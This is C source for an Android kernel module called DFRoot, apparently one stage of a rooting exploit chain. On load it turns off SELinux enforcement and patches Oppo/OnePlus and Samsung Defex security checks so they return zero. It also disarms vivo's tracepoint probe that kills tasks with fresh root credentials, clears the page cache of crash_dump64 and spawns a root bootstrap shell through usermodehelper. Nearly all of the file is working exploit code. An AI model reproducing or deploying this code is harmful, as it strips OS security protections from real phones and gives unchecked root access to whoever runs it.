#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/ptrace.h>
#include <linux/slab.h>
#include <asm/cpufeature.h>
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("DFRoot LKM");
/* W1c: disarm vivo's vr.ko sys_exit tracepoint probe. exp.c scans the module
 * image for DF_VR_MAGIC right before writing it into the page cache and
 * patches df_vr_cfg[1] with the funcs offset inside struct tracepoint
 * (device-specific, parsed from GhostLock / kernel image). Offset 0 = the
 * stage is off and the probe is left alone. volatile: written externally.
 * cfg[2] = auto mode: the offset is resolved at runtime here in ring 0 by
 * parsing /sys/kernel/btf/vmlinux (the kernel's own type info - the only
 * trustworthy per-device source; vivo's vr.ko unlink-hides itself so
 * module-list-based checks are useless, and mainline-derived constants are
 * wrong: vivo adds a probestub member, shifting funcs from 0x40 to 0x48).
 * On resolution failure the stage REFUSES to write, aborts the root chain
 * (bootstrap binary renamed away) and reports via /dev/dfvrx - a blind
 * write against a guessed member would corrupt the tracepoint. */
#define DF_VR_MAGIC 0xDFC0FF16DFC0FF16ULL
volatile unsigned long df_vr_cfg[3] = { DF_VR_MAGIC, 0, 0 };


typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
typedef unsigned long (*module_kallsyms_lookup_name_t)(const char *name);
typedef void *(*umh_setup_t)(const char *path, char **argv, char **envp, gfp_t gfp,
                             void *init, void *cleanup, void *data);
typedef int (*umh_exec_t)(void *info, int wait);
typedef int  (*kern_path_t)(const char *, unsigned int, struct path *);
typedef int  (*invalidate_t)(struct address_space *);
typedef void (*path_put_t)(const struct path *);
typedef int  (*insn_patch_t)(void *addrs[], u32 insns[], int cnt);
typedef struct file   *(*filp_open_t)(const char *, int, umode_t);
typedef ssize_t        (*kernel_read_t)(struct file *, void *, size_t, loff_t *);
typedef int            (*filp_close_t)(struct file *, void *);
typedef void          *(*vzalloc_t)(unsigned long);
typedef void           (*vfree_t)(const void *);

static insn_patch_t insn_patch_text;

static __nocfi void patch_fn_ret_zero(void *fn)
{
    u32  insn  = *(u32 *)fn;
    int  skip  = 0;
    bool pac_a = false, pac_b = false;
    void *addrs[2];
    u32   insns[2];

    while (skip < 2) {
        switch (insn) {
        case 0xD503233F: pac_a = true; goto skip_insn; /* PACIASP */
        case 0xD503237F: pac_b = true; goto skip_insn; /* PACIBSP */
        case 0xD503241F:                               /* BTI     */
        case 0xD503245F:                               /* BTI c   */
        case 0xD503249F:                               /* BTI j   */
        case 0xD50324DF:                               /* BTI jc  */
        skip_insn:
            insn = *(u32 *)((u8 *)fn + ++skip * 4);
            continue;
        }
        break;
    }

    addrs[0] = (u8 *)fn + skip * 4;
    addrs[1] = (u8 *)fn + skip * 4 + 4;
    insns[0] = 0xD2800000;
    /* PACIASP/PACIBSP are hint-space NOPs on CPUs without ARMv8.3 pointer auth,
     * but RETAA/RETAB are not — they fault as undefined. Only emit them when
     * hardware auth is actually present and the signed LR needs stripping. */
    insns[1] = (pac_b && system_supports_address_auth()) ? 0xD65F0FFF :
               (pac_a && system_supports_address_auth()) ? 0xD65F0BFF :
                                                           0xD65F03C0;

    if (insn_patch_text(addrs, insns, 2))
        pr_warn("dfroot: patch failed at %px\n", fn);
}

/* ---- W1c auto-resolve: BTF --------------------------------------------
 * Read /sys/kernel/btf/vmlinux and take offsetof(struct tracepoint, funcs)
 * straight from the running kernel's own type info - authoritative and
 * config-aware (LTO / padding / vendor members all baked in; this is what
 * put funcs at 0x48 on vivo where mainline sits at 0x40). Logic identical
 * to the vrsolve userspace tool verified on-device. Returns the byte
 * offset, or 0 when BTF is unavailable or unusable. */
static unsigned long __nocfi vr_btf_funcs(filp_open_t f_open,
                                          kernel_read_t k_read,
                                          filp_close_t f_close,
                                          vzalloc_t valloc, vfree_t vfree)
{
    struct file *f;
    void *buf;
    loff_t pos = 0;
    ssize_t n;
    unsigned char *b;
    unsigned long types, strtab, tp_end, p;
    unsigned long off = 0;
    const unsigned int BTF_SZ = 8u * 1024 * 1024;

    f = f_open("/sys/kernel/btf/vmlinux", O_RDONLY, 0);
    if (IS_ERR_OR_NULL(f)) {
        pr_info("dfroot: vr auto: BTF not available\n");
        return 0;
    }
    buf = valloc(BTF_SZ);
    if (!buf) {
        f_close(f, NULL);
        return 0;
    }
    /* Loop the read: a single kernel_read on the BTF sysfs attribute
     * short-reads (observed on-device - 6MB file, one call returns less),
     * which the first cut mistook for truncation. 1MB chunks until EOF. */
    {
        size_t total = 0;
        while (total < BTF_SZ) {
            size_t chunk = BTF_SZ - total;
            if (chunk > 1024 * 1024)
                chunk = 1024 * 1024;
            n = k_read(f, buf + total, chunk, &pos);
            if (n <= 0)
                break;
            total += (size_t)n;
        }
        n = (ssize_t)total;
    }
    f_close(f, NULL);
    if (n < 64) {
        pr_warn("dfroot: vr auto: BTF read short (%zd)\n", n);
        vfree(buf);
        return 0;
    }
    b = buf;
    /* struct btf_header: magic u16, version u8, flags u8, hdr_len u32,
     * type_off u32, type_len u32, str_off u32, str_len u32. */
    {
        unsigned short magic = b[0] | ((unsigned short)b[1] << 8);
        unsigned int hdr_len, type_off, type_len, str_off;
        if (magic != 0xeb9f) {
            pr_warn("dfroot: vr auto: BTF magic %04x\n", magic);
            vfree(buf);
            return 0;
        }
        hdr_len  = b[4] | (b[5] << 8) | (b[6] << 16) | ((unsigned int)b[7] << 24);
        type_off = b[8] | (b[9] << 8) | (b[10] << 16) | ((unsigned int)b[11] << 24);
        type_len = b[12] | (b[13] << 8) | (b[14] << 16) | ((unsigned int)b[15] << 24);
        str_off  = b[16] | (b[17] << 8) | (b[18] << 16) | ((unsigned int)b[19] << 24);
        if ((long)hdr_len + type_off + type_len > n) {
            pr_warn("dfroot: vr auto: BTF truncated\n");
            vfree(buf);
            return 0;
        }
        types  = hdr_len + type_off;
        strtab = hdr_len + str_off;
        tp_end = types + type_len;
    }

    /* Walk BTF types to the STRUCT named "tracepoint", then find the
     * member named "funcs". btf_type = {name_off u32, info u32, size/type
     * u32}; struct member = {name_off u32, type u32, offset u32}. */
    p = types;
    while (p + 12 <= tp_end) {
        unsigned int info     = b[p+4] | (b[p+5] << 8) | (b[p+6] << 16) | ((unsigned int)b[p+7] << 24);
        unsigned int kind = (info >> 24) & 0x1f;
        unsigned int vlen = info & 0xffff;
        unsigned long pay;
        if (kind == 4) { /* STRUCT */
            unsigned long j, m = p + 12;
            if (m + (unsigned long)vlen * 12 > tp_end) break;
            for (j = 0; j < vlen; j++, m += 12) {
                unsigned int mn = b[m] | (b[m+1] << 8) | (b[m+2] << 16) | ((unsigned int)b[m+3] << 24);
                unsigned int mo = b[m+8] | (b[m+9] << 8) | (b[m+10] << 16) | ((unsigned int)b[m+11] << 24);
                const char *nm;
                if (strtab + mn >= (unsigned long)n)
                    continue;
                nm = (const char *)b + strtab + mn;
                if (!strcmp(nm, "funcs")) {
                    off = mo / 8;   /* BTF member offsets are in bits */
                    goto out;
                }
            }
        }
        pay = 0;
        switch (kind) {
            case 1: pay = 4; break;              /* INT */
            case 3: pay = 12; break;             /* ARRAY */
            case 4: case 5: pay = (unsigned long)vlen * 12; break; /* STRUCT/UNION */
            case 6: pay = (unsigned long)vlen * 8; break;  /* ENUM */
            case 13: pay = (unsigned long)vlen * 8; break; /* FUNC_PROTO */
            case 14: pay = 8; break;             /* VAR */
            case 15: pay = (unsigned long)vlen * 12; break; /* DATASEC */
            case 17: pay = 8; break;             /* DECL_TAG */
            case 19: pay = (unsigned long)vlen * 12; break; /* ENUM64 */
            default: pay = 0; break;             /* PTR/FWD/typedef quals/FUNC/... */
        }
        p += 12 + pay;
    }
out:
    if (off > 0x100) {
        pr_warn("dfroot: vr auto: implausible BTF funcs offset %lu\n", off);
        off = 0;
    }
    vfree(buf);
    return off;
}

static int __nocfi __init dfroot_init(void)
{
    kallsyms_lookup_name_t get_addr;
    kern_path_t  kern_path_fn;
    invalidate_t invalidate_fn;
    path_put_t   path_put_fn;
    struct path  p;
    umh_setup_t umh_setup;
    umh_exec_t  umh_exec;
    bool *selinux_state;
    module_kallsyms_lookup_name_t mkln;
    struct kprobe kln_kp;
    void *oplus_exe_fn, *oplus_root_fn, *defex_enforce_fn, *defex_umh_fn;
    void *info;
    int ret;
    const char *vr_marker = "";

    // UMH command to run. Upstream 4.2-4.5 replaced the old
    // "touch /dev/dfm0; rmmod oplus_* 2>/dev/null; exit 0" chain. Those rmmods
    // tripped the Oppo/OnePlus security anti-tamper reset (our issue #21), and
    // because `sh -c` returns the exit code of the LAST command, a failing
    // rmmod also made the helper report "returned 256" everywhere else, which
    // is what killed the run at the verify stage (our issue #5). The vendor
    // hardening checks are now patched in-kernel with aarch64_insn_patch_text,
    // the helper only touches the marker and execs bootstrap, and the call is
    // UMH_WAIT_EXEC, so there is no child exit status left to leak.
    static const char sh[] = "/system/bin/sh";
    static const char bootstrap[] =
        "/data/user_de/0/roro.stellar.yuehong/files/dfroot/bootstrap";
    static char cmd[1024];
    static char *envp[] = { "PATH=/system/bin", NULL };
    static char *argv[] = { (char *)sh, "-c", cmd, NULL };
    // Symbol finder
    kln_kp = (struct kprobe){ .symbol_name = "kallsyms_lookup_name" };
    if (register_kprobe(&kln_kp) < 0) {
        pr_err("dfroot: kallsyms_lookup_name not found\n");
        return -EINVAL;
    }
    get_addr = (kallsyms_lookup_name_t)kln_kp.addr;
    unregister_kprobe(&kln_kp);

    insn_patch_text = (insn_patch_t)get_addr("aarch64_insn_patch_text");
    if (!insn_patch_text) {
        pr_err("dfroot: aarch64_insn_patch_text not found\n");
        return -EINVAL;
    }

    mkln = (module_kallsyms_lookup_name_t)get_addr("module_kallsyms_lookup_name");

    // Invalidate page_cache for crash_dump64
    // NOTE: this can cause issues if a process is currently executing
    //   crash_dump64. We may want to revert to manual restore patching
    kern_path_fn  = (kern_path_t) get_addr("kern_path");
    invalidate_fn = (invalidate_t)get_addr("invalidate_inode_pages2");
    path_put_fn   = (path_put_t)  get_addr("path_put");
    if (!kern_path_fn || !invalidate_fn || !path_put_fn) {
        pr_err("dfroot: cache drop symbols missing\n");
    } else if (kern_path_fn("/apex/com.android.runtime/bin/crash_dump64",
                            LOOKUP_FOLLOW, &p)) {
        pr_err("dfroot: kern_path failed for crash_dump64\n");
    } else {
        invalidate_fn(p.dentry->d_inode->i_mapping);
        path_put_fn(&p);
        pr_info("dfroot: cleared page cache for crash_dump64\n");
    }

    // Disable SELinux
    selinux_state = (bool *)get_addr("selinux_state");
    if (!selinux_state) {
        pr_err("dfroot: selinux_state not found\n");
        return -EINVAL;
    }
    WRITE_ONCE(*selinux_state, false);
    pr_info("dfroot: selinux_state permissive\n");

    // Oppo/OnePlus
    oplus_exe_fn = (void *)(mkln ? mkln("oplus_exe_block_ret_handler") : 0);
    if (!oplus_exe_fn)
        pr_err("dfroot: oplus_exe_block_ret_handler not found, skipping\n");
    else {
        patch_fn_ret_zero(oplus_exe_fn);
        pr_info("dfroot: oplus_exe_block_ret_handler patched\n");
    }

    oplus_root_fn = (void *)(mkln ? mkln("oplus_root_check_post_handler") : 0);
    if (!oplus_root_fn)
        pr_err("dfroot: oplus_root_check_post_handler not found, skipping\n");
    else {
        patch_fn_ret_zero(oplus_root_fn);
        pr_info("dfroot: oplus_root_check_post_handler patched\n");
    }

    // Samsung
    defex_enforce_fn = (void *)get_addr("task_defex_enforce");
    if (!defex_enforce_fn)
        pr_err("dfroot: task_defex_enforce not found, skipping\n");
    else {
        patch_fn_ret_zero(defex_enforce_fn);
        pr_info("dfroot: task_defex_enforce patched\n");
    }

    defex_umh_fn = (void *)get_addr("task_defex_user_exec");
    if (!defex_umh_fn)
        pr_err("dfroot: task_defex_user_exec not found, skipping\n");
    else {
        patch_fn_ret_zero(defex_umh_fn);
        pr_info("dfroot: task_defex_user_exec patched\n");
    }

    // W1c: zero __tracepoint_sys_exit->funcs so vivo's vr.ko exit probe (which
    // kills tasks with fresh root creds) never fires again. Pure data write -
    // no hooks, no callbacks - same semantics as GhostLock's W1c stage. Runs
    // right before the UMH/bootstrap/ksud chain, i.e. before anything with
    // fresh root creds is spawned (提权 -> Root -> 用Root改 -> 拉起管理器).
    // cfg[2]=1 (auto): the offset comes from the kernel's own BTF - the
    // verified per-device ground truth (vrsolve on-device: 0x48, matching
    // GhostLock conf and the manual runs). Failure = REFUSE + abort the root
    // chain: the bootstrap binary is renamed away so the shellcode execve
    // fails, /dev/dfvrx + files/vr_offset.txt("fail") tell the app, and the
    // manager is never launched (a fresh-root task would be killed by the
    // still-armed probe and wedge the kernel). Never a blind write.
    // cfg[2]=0: cfg[1] is the user-supplied offset - the verified manual
    // path, unchanged.
    if (READ_ONCE(df_vr_cfg[2])) {
        static char vbuf[160];
        static const char ABORT[] =
            " touch /dev/dfvrx;"
            " echo fail > /data/user_de/0/roro.stellar.yuehong/files/dfroot/vr_offset.txt 2>/dev/null;"
            " mv /data/user_de/0/roro.stellar.yuehong/files/dfroot/bootstrap"
            " /data/user_de/0/roro.stellar.yuehong/files/dfroot/bootstrap.abort 2>/dev/null;";
        char *tp = (char *)get_addr("__tracepoint_sys_exit");
        filp_open_t f_open;
        kernel_read_t k_read;
        filp_close_t f_close;
        vzalloc_t valloc;
        vfree_t vfree;
        unsigned long off = 0;
        if (!tp) {
            pr_warn("dfroot: vr auto: __tracepoint_sys_exit missing, abort\n");
            vr_marker = ABORT;
            goto vr_done;
        }
        f_open  = (filp_open_t)get_addr("filp_open");
        k_read  = (kernel_read_t)get_addr("kernel_read");
        f_close = (filp_close_t)get_addr("filp_close");
        valloc  = (vzalloc_t)get_addr("vzalloc");
        vfree   = (vfree_t)get_addr("vfree");
        if (!f_open || !k_read || !f_close || !valloc || !vfree) {
            pr_warn("dfroot: vr auto: file/vmem symbols missing, abort\n");
            vr_marker = ABORT;
            goto vr_done;
        }
        off = vr_btf_funcs(f_open, k_read, f_close, valloc, vfree);
        if (!off) {
            pr_warn("dfroot: vr auto: funcs offset unresolved, abort\n");
            vr_marker = ABORT;
            goto vr_done;
        }
        {
            void **funcs_slot = (void **)(tp + off);
            unsigned long cur = (unsigned long)READ_ONCE(*funcs_slot);
            if (cur && !(cur >= 0xffffff8000000000UL && !(cur & 7))) {
                pr_warn("dfroot: vr auto: slot@%lu holds non-pointer %lx, abort\n",
                        off, cur);
                vr_marker = ABORT;
                goto vr_done;
            }
            if (cur) {
                WRITE_ONCE(*funcs_slot, NULL);
                pr_info("dfroot: W1c vr sys_exit probe disarmed (funcs=NULL, off=%lu, btf)\n",
                        off);
            } else {
                pr_info("dfroot: W1c vr sys_exit funcs already NULL (off=%lu, btf)\n", off);
            }
            snprintf(vbuf, sizeof(vbuf),
                     " touch /dev/dfvra;"
                     " echo %lu > /data/user_de/0/roro.stellar.yuehong/files/dfroot/vr_offset.txt 2>/dev/null;",
                     off);
            vr_marker = vbuf;
        }
vr_done:;
    } else if (READ_ONCE(df_vr_cfg[1])) {
        char *tp = (char *)get_addr("__tracepoint_sys_exit");
        if (!tp) {
            pr_warn("dfroot: W1c __tracepoint_sys_exit missing, vr intact\n");
            vr_marker = " touch /dev/dfvre;"
                        " mv /data/user_de/0/roro.stellar.yuehong/files/dfroot/bootstrap"
                        " /data/user_de/0/roro.stellar.yuehong/files/dfroot/bootstrap.abort 2>/dev/null;";
        } else {
            void **funcs_slot = (void **)(tp + READ_ONCE(df_vr_cfg[1]));
            if (READ_ONCE(*funcs_slot)) {
                WRITE_ONCE(*funcs_slot, NULL);
                pr_info("dfroot: W1c vr sys_exit probe disarmed (funcs=NULL, off=%lu)\n",
                        READ_ONCE(df_vr_cfg[1]));
            } else {
                pr_info("dfroot: W1c vr sys_exit funcs already NULL\n");
            }
            vr_marker = " touch /dev/dfvr0;";
        }
    }

    // Build the command after the VR stage selected its success or abort marker.
    snprintf(cmd, sizeof(cmd),
        "touch /dev/dfm0;"
        "%s"
        " exec %s",
        vr_marker, bootstrap);

    // Run UMH command
    umh_setup = (umh_setup_t)get_addr("call_usermodehelper_setup");
    umh_exec  = (umh_exec_t)get_addr("call_usermodehelper_exec");
    if (!umh_setup || !umh_exec) {
        pr_err("dfroot: usermodehelper symbols missing (setup=%px exec=%px)\n",
               umh_setup, umh_exec);
        return -EINVAL;
    }

    info = umh_setup(sh, argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (!info) {
        pr_err("dfroot: usermodehelper_setup: returned NULL\n");
        return -EINVAL;
    }
    // bypass CONFIG_STATIC_USERMODEHELPER_PATH="" overriding path to ""
    ((struct subprocess_info *)info)->path = sh;

    ret = umh_exec(info, UMH_WAIT_EXEC);
    pr_info("dfroot: usermodehelper_exec returned %d\n", ret);
    
    return -ENODEV; /* return any error to unload module */
}

/* no module_exit: we never unload; saves .exit sections */
module_init(dfroot_init);
